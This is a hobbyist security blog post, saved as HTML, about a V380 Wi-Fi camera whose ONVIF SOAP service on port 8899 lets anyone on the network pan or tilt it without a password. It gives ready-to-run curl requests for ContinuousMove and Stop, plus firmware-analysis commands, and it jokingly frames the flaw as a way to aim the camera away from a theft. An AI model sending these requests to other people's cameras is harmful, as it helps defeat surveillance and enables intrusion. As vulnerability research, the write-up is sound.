@@ -1,0 +1,56 @@
+<!DOCTYPE html><html lang=en> <head><title>v380 IPcam: Move with SOAP | callerxyz</title><meta charset=utf-8><meta name=referrer content=origin-when-cross-origin><link href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/feeds/all.atom.xml type=application/atom+xml rel=alternate title="callerxyz Full Atom Feed"><meta property=og:site_name content=callerxyz><meta property=og:locale content=en-GB><meta property=og:title content="v380 IPcam: Move with SOAP"><meta property=og:description content="You can remotely pan/tilt the camera so it points away from the crown jewels while you move in to steal them."><meta property=og:url content=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/v380-ipcam-move-with-soap><meta property=og:type content=article><meta property=article:published_time content="2020-03-24 23:00:00+00:00"><meta property=article:modified_time content><meta name=keywords content="security, hardware"><meta name=tags content=security><meta name=article:tag content=security><meta name=tags content=hardware><meta name=article:tag content=hardware><meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width, initial-scale=1"><link rel=stylesheet href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/theme/css/style.css><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css referrerpolicy=no-referrer><link href="https://fonts.googleapis.com/css2?family=Arima+Madurai:wght@400;700&family=Montserrat:ital,wght@0,400;0,800;1,400;1,800&family=Orbitron:wght@700&family=Share+Tech+Mono&display=swap" rel=stylesheet referrerpolicy=no-referrer></head> <body> <main> <article> <header> <h1>v380 IPcam: Move with SOAP</h1> <time datetime=2020-03-24T23:00:00+00:00>March 2020</time> </header> <div class=content> <div class=series> <p>Part #2 of the "v380 IPcam" series:</p> <ol class=parts> <li> <a href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/v380-ipcam-hardware-hackz>v380 IPcam: Hardware Hackz</a> </li> <li class=active> <a href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/v380-ipcam-move-with-soap>v380 IPcam: Move with SOAP</a> </li> <li> <a href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/v380-ipcam-firmware-patching>v380 IPcam: Firmware patching</a> </li> </ol> </div> <p>You can remotely pan/tilt the camera so it points away from the crown jewels while you move in to steal them.</p> <p>I finally got a chance to play with the IPcam after leaving it in a cupboard for (amazingly) 2 years. The <code>WiFi Smart Net Camera V380</code> has port 8899 open running <code>gSOAP/2.8</code>. It uses SOAP <img alt=🤮 class=emojione src=https://cdn.jsdelivr.net/emojione/assets/4.0/png/64/1f92e.png title=:face_vomiting:> to implement the ONVIF standard for device management. Most IP camera software can talk ONVIF, so it&rsquo;s not so bad.</p> <p>I downloaded the wsdl (schema definition, I say <span class=ipa>/wɪzdl/</span>) for the PTZ (Pan-tilt-zoom) function and loaded it into SoapUI. Most of the functions weren&rsquo;t implemented, but two nice ones were:</p> <ul> <li>ContinuousMove</li> <li>Stop</li> </ul> <p>So it looks like even though the camera requires a password to be accessed via the app, it can actually be panned/tilted by anyone on the network without a password.</p> <p><figure><img alt="PTZ requests and responses" src=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/v380-ipcam-move-with-soap/SOAPUI-ptz.png><figcaption>PTZ requests and responses</figcaption></figure></p> <h2 id=examples>Examples</h2> <div class=highlight><pre><span></span>curl http://192.168.1.1:8899/ <span class=se>\</span>
+  -H <span class=s1>&#39;Content-Type: application/soap+xml;charset=UTF-8;action=&quot;http://www.onvif.org/ver20/ptz/wsdl/ContinuousMove&quot;&#39;</span> <span class=se>\</span>
+  --data <span class=s1>&#39;&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot; xmlns:wsdl=&quot;http://www.onvif.org/ver20/ptz/wsdl&quot; xmlns:sch=&quot;http://www.onvif.org/ver10/schema&quot;&gt;</span>
+<span class=s1>   &lt;soap:Header/&gt;</span>
+<span class=s1>   &lt;soap:Body&gt;</span>
+<span class=s1>      &lt;wsdl:ContinuousMove&gt;</span>
+<span class=s1>         &lt;wsdl:ProfileToken&gt;blah&lt;/wsdl:ProfileToken&gt;</span>
+<span class=s1>         &lt;wsdl:Velocity&gt;</span>
+<span class=s1>            &lt;sch:PanTilt x=&quot;-0.1&quot; y=&quot;0.1&quot; space=&quot;0.3&quot;/&gt;</span>
+<span class=s1>            &lt;sch:Zoom x=&quot;0&quot; space=&quot;0&quot;/&gt;</span>
+<span class=s1>         &lt;/wsdl:Velocity&gt;</span>
+<span class=s1>      &lt;/wsdl:ContinuousMove&gt;</span>
+<span class=s1>   &lt;/soap:Body&gt;</span>
+<span class=s1>&lt;/soap:Envelope&gt;&#39;</span>
+curl http://192.168.1.1:8899/ <span class=se>\</span>
+  -H <span class=s1>&#39;Content-Type: application/soap+xml;charset=UTF-8;action=&quot;http://www.onvif.org/ver20/ptz/wsdl/Stop&quot;&#39;</span> <span class=se>\</span>
+  --data <span class=s1>&#39;&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot; xmlns:wsdl=&quot;http://www.onvif.org/ver20/ptz/wsdl&quot;&gt;</span>
+<span class=s1>   &lt;soap:Header/&gt;</span>
+<span class=s1>   &lt;soap:Body&gt;</span>
+<span class=s1>      &lt;wsdl:Stop&gt;</span>
+<span class=s1>         &lt;wsdl:ProfileToken&gt;whatevs&lt;/wsdl:ProfileToken&gt;</span>
+<span class=s1>         &lt;wsdl:PanTilt&gt;1&lt;/wsdl:PanTilt&gt;</span>
+<span class=s1>         &lt;wsdl:Zoom&gt;1&lt;/wsdl:Zoom&gt;</span>
+<span class=s1>      &lt;/wsdl:Stop&gt;</span>
+<span class=s1>   &lt;/soap:Body&gt;</span>
+<span class=s1>&lt;/soap:Envelope&gt;&#39;</span>
+</pre></div> <p>Note, this doesn&rsquo;t give us stream access or command execution.</p> <h2 id=implemented-actions>Implemented actions</h2> <p>After downloading a firmware patch and extracting with <code>binwalk</code>, I searched for the SOAP server with <code>grep -R -a gSOAP</code> and found <code>libonvif.so</code>.</p> <p>Then I searched the binary for names of implemented commands using <code>rabin2 -zzz</code> which often gives nicer results than <code>strings</code>. It&rsquo;s part of Radare2, which I have yet to learn how to use properly. Anyway:</p> <div class=highlight><pre><span></span>$ rabin2 -zzz -N <span class=m>8</span> squashfs-root/lib/libonvif.so <span class=p>|</span> <span class=se>\</span>
+    grep <span class=s1>&#39;string=[^_]*:.*Response$&#39;</span> <span class=p>|</span> <span class=se>\</span>
+    sed <span class=s1>&#39;s/[^:]*:\(.*\)Response/\1/&#39;</span> <span class=p>|</span> <span class=se>\</span>
+    sort -u
+ContinuousMove
+GetAudioEncoderConfiguration
+GetAudioEncoderConfigurations
+GetAudioSourceConfiguration
+GetAudioSourceConfigurations
+GetAudioSources
+GetCapabilities
+GetConfiguration
+GetConfigurationOptions
+GetConfigurations
+GetDeviceInformation
+GetOptions
+GetProfile
+GetProfiles
+GetServices
+GetStreamUri
+GetSystemDateAndTime
+GetVideoEncoderConfiguration
+GetVideoEncoderConfigurationOptions
+GetVideoEncoderConfigurations
+GetVideoSourceConfiguration
+GetVideoSourceConfigurations
+GetVideoSources
+SetVideoEncoderConfiguration
+Stop
+</pre></div> <p>So 25 actions in total, but I think the <code>ContinuousMove</code> is the only fun one.</p> </div> <div class=tags>Tags: <ul><li><a href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/tag/security>security</a></li><li><a href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/tag/hardware>hardware</a></li></ul></div> </article> </main> <footer> <br><a href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ>[blog by caller]</a> Correspondence welcome at ℬ㏒ {@} ㎈ℓℯℛ.ⓧⓨℤ </footer> </body> </html>
